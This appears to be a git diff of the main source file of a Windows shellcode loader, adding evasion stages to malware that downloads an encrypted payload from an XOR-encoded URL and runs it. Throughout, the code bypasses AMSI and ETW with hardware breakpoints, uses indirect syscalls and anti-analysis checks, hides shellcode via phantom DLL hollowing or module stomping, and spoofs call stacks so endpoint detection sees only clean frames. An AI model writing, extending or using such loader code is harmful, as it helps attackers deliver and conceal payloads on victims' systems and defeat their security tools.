@@ -1,17 +1,18 @@
 // =============================================
 // main.c - Shellcode Loader
 //
-// Execution: Module Stomping + Thread Pool Callback + Call Stack Spoofing
-// Memory:    Shellcode planted in signed DLL .text section
-// Thread:    No NtCreateThreadEx — uses TpAllocWork/TpPostWork (reuses existing threads)
-// Stack:     SpoofCallback tail-call preserves clean ntdll thread pool frames
+// Evasion:  Patchless AMSI/ETW (VEH + HW breakpoints)
+// Memory:   Phantom DLL Hollowing → Module Stomp → NtAllocateVirtualMemory
+// Thread:   Thread pool callback (TpAllocWork/TpPostWork)
+// Stack:    Call gadget injection + tail-call spoofing
+// Syscalls: Indirect with randomized gadget pool
 // =============================================
 
 #include "Common.h"
 
 // Instantiate encoded data (auto-generated in Payload.h)
-static unsigned char EncodedUrl[] = INIT_ENCODED_URL;
-static unsigned char ProtectedKey[] = INIT_PROTECTED_KEY;
+static unsigned char EncodedUrl[]    = INIT_ENCODED_URL;
+static unsigned char ProtectedKey[]  = INIT_PROTECTED_KEY;
 
 // -----------------------------------------------
 // Decode XOR-encoded URL string at runtime
@@ -30,32 +31,38 @@ int Main(VOID) {
     API_HASHING WinApis = { 0 };
     NTSTATUS    STATUS  = 0x00;
 
+    // --- IAT Camouflage ---
     IatCamouflage();
 
+    // --- Anti-Analysis (skipped in DEBUG builds) ---
 #ifndef DEBUG
     if (!AntiAnalysis())
         return 0;
 #endif
 
+    // --- Initialize indirect syscall engine ---
+    // Builds gadget pool (all syscall;ret in ntdll) + resolves 5 NT syscalls
     if (!InitializeNtSyscalls(&NtApis))
         return 0;
 
+    // --- Initialize WinAPI function pointers (PEB hash walking) ---
     if (!InitializeWinApis(&WinApis))
         return 0;
 
-    PatchEtw(&WinApis);
-    PatchAmsi(&WinApis);
+    // --- Patchless AMSI/ETW bypass ---
+    // VEH + hardware breakpoints on EtwEventWrite/AmsiScanBuffer
+    // NtContinue sets DR0/DR1 without ETW-TI telemetry
+    PatchlessAmsiEtw(&WinApis);
 
-    // Key recovery
+    // --- Key recovery ---
     PBYTE pRealKey = NULL;
     if (!BruteForceDecryption(HINT_BYTE, ProtectedKey, KEY_SIZE, &pRealKey))
         return 0;
 
-    // Load encrypted payload
-    PBYTE pPayload = NULL;
+    // --- Download encrypted payload ---
+    PBYTE pPayload     = NULL;
     DWORD dwPayloadSize = 0;
 
-    // Decode URL and download
     CHAR szUrl[512] = { 0 };
     DecodeUrl(szUrl, EncodedUrl, URL_LENGTH, URL_XOR_KEY);
     LOG("[*] Downloading payload...");
@@ -63,11 +70,10 @@ int Main(VOID) {
         HeapFree(GetProcessHeap(), 0, pRealKey);
         return 0;
     }
-    // Wipe URL from stack
     MemSet(szUrl, 0, sizeof(szUrl));
     LOG("[+] Payload loaded");
 
-    // Decrypt
+    // --- Decrypt ---
     if (!Rc4DecryptPayload(&WinApis, pPayload, dwPayloadSize, pRealKey, KEY_SIZE)) {
         HeapFree(GetProcessHeap(), 0, pPayload);
         HeapFree(GetProcessHeap(), 0, pRealKey);
@@ -77,21 +83,45 @@ int Main(VOID) {
     HeapFree(GetProcessHeap(), 0, pRealKey);
 
     // ============================================================
-    // Stage 1: Module Stomping
-    // Try to plant shellcode in a legitimate DLL's .text section.
-    // If shellcode fits, execution memory is attributed to a
-    // signed Windows DLL — EDR memory scans see a legit module.
-    // Falls back to NtAllocateVirtualMemory if too large.
+    // Stage 1: Shellcode Placement (3-tier fallback)
+    //
+    // 1. Phantom DLL Hollowing (NTFS Transactions)
+    //    - Section backed by rolled-back transacted file
+    //    - EDR can't verify memory against disk (FILE_OBJECT mismatch)
+    //    - Requires write access to System32 DLL (elevated)
+    //
+    // 2. Module Stomping
+    //    - LoadLibrary + overwrite .text section
+    //    - Memory attributed to signed DLL
+    //    - Detectable by EDR integrity checks (disk vs memory)
+    //
+    // 3. NtAllocateVirtualMemory (last resort)
+    //    - Private RWX memory (most suspicious)
+    //    - Always works regardless of shellcode size
     // ============================================================
-    PVOID pExec = NULL;
-    BOOL  bStomped = ModuleStomp(&WinApis, pPayload, dwPayloadSize, &pExec);
 
-    if (!bStomped) {
-        LOG("[*] Module stomp failed, fallback to NtAllocateVirtualMemory");
+    PVOID pExec   = NULL;
+    BOOL  bPlaced = FALSE;
 
-        // Allocate RW memory via indirect syscall
+    // Try phantom DLL hollowing first
+    bPlaced = PhantomDllHollow(&WinApis, &NtApis, pPayload, dwPayloadSize, &pExec);
+    if (bPlaced) {
+        LOG("[+] Shellcode placed via phantom DLL hollowing");
+    }
+
+    // Fall back to module stomping
+    if (!bPlaced) {
+        bPlaced = ModuleStomp(&WinApis, pPayload, dwPayloadSize, &pExec);
+        if (bPlaced) {
+            LOG("[+] Shellcode placed via module stomping");
+        }
+    }
+
+    // Last resort: direct allocation
+    if (!bPlaced) {
+        LOG("[*] Fallback to NtAllocateVirtualMemory");
+
         SIZE_T sRegion = (SIZE_T)dwPayloadSize;
-
         SET_SYSCALL(NtApis.NtAllocateVirtualMemory);
         STATUS = RunSyscall(
             (ULONG_PTR)(HANDLE)-1, (ULONG_PTR)&pExec,
@@ -104,10 +134,8 @@ int Main(VOID) {
             return 0;
         }
 
-        // Copy shellcode
         MemCopy(pExec, pPayload, dwPayloadSize);
 
-        // RW -> RWX (RWX for Go-based shellcode that writes to own pages)
         ULONG   dwOldProt  = 0;
         SIZE_T  sProtSize  = (SIZE_T)dwPayloadSize;
         PVOID   pProtAddr  = pExec;
@@ -132,35 +160,29 @@ int Main(VOID) {
     // ============================================================
     // Stage 2: Call Stack Spoofing + Callback Execution
     //
-    // Instead of NtCreateThreadEx (triggers PsSetCreateThreadNotifyRoutine
-    // kernel callback), we execute via the Windows Thread Pool.
+    // Find a 'call rbx' (FF D3) gadget in ntdll to inject a
+    // legitimate stack frame. Combined with module stomping or
+    // phantom hollowing, the full call stack looks clean:
     //
-    // TpAllocWork + TpPostWork dispatch work to an EXISTING thread pool
-    // thread — no new thread is created, so the kernel thread-creation
-    // callback never fires.
-    //
-    // SpoofCallback (ASM) is the thread pool callback wrapper. It uses
-    // a tail-call (JMP, not CALL) to the shellcode, so no new stack
-    // frame is created. The resulting call stack is:
-    //
-    //   shellcode RIP  (in stomped DLL .text = legitimate module)
+    //   shellcode RIP  (in stomped/phantom DLL .text)
+    //   -> gadget site  (in ntdll — 'call rbx' return addr)
     //   -> TppWorkpExecute     (ntdll)
     //   -> TppWorkerThread     (ntdll)
     //   -> RtlUserThreadStart  (ntdll)
-    //
-    // All frames are clean ntdll internals. No trace of the loader.
     // ============================================================
 
-    // Store shellcode address for the ASM callback wrapper
-    SetSpoofTarget(pExec);
-
-    // Resolve thread pool functions from ntdll (hash-based, no strings)
+    // Find call gadget in ntdll for stack frame injection
     BYTE xNtdll[] = XSTR_NTDLL_DLL;
     DEOBF(xNtdll);
     PVOID pNtdll = (PVOID)WinApis.pGetModuleHandleA((LPCSTR)xNtdll);
-    if (!pNtdll)
-        return 0;
+    PVOID pCallGadget = NULL;
+    if (pNtdll)
+        pCallGadget = FindCallGadget(pNtdll);
 
+    // Store target + gadget for the ASM callback wrapper
+    SetSpoofTarget(pExec, pCallGadget);
+
+    // Resolve thread pool functions from ntdll (hash-based)
     fnTpAllocWork  pTpAllocWork  = (fnTpAllocWork)FetchExportAddress(pNtdll, TpAllocWork_JOAAT);
     fnTpPostWork   pTpPostWork   = (fnTpPostWork)FetchExportAddress(pNtdll, TpPostWork_JOAAT);
 
@@ -179,7 +201,6 @@ int Main(VOID) {
     pTpPostWork(pWork);
 
     // Keep process alive with infinite delay (indirect syscall)
-    // NtDelayExecution avoids any kernel32 dependency for the wait
     LARGE_INTEGER li;
     li.QuadPart = -315360000000000LL; // ~1 year in 100ns units
     while (TRUE) {
